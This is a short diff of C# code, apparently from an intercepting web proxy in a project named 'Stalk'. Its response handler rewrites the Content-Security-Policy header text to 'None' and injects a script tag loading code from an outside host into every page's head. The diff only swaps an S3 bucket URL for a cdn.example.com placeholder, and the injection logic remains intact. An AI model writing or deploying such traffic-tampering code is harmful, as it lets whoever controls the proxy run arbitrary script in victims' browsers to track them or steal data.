@@ -71,7 +71,7 @@ namespace Stalk
             StringBuilder body = new StringBuilder(await e.GetResponseBodyAsString());
 
             body.Replace("Content-Security-Policy", "None");
-            body.Replace("</head>", "<script src=\"https://stalk-scripts.s3-sa-east-1.amazonaws.com/example.js\"></script></head>");
+            body.Replace("</head>", "<script src=\"https://cdn.example.com/example.js\"></script></head>");
 
             e.SetResponseBodyString(body.ToString());
         }
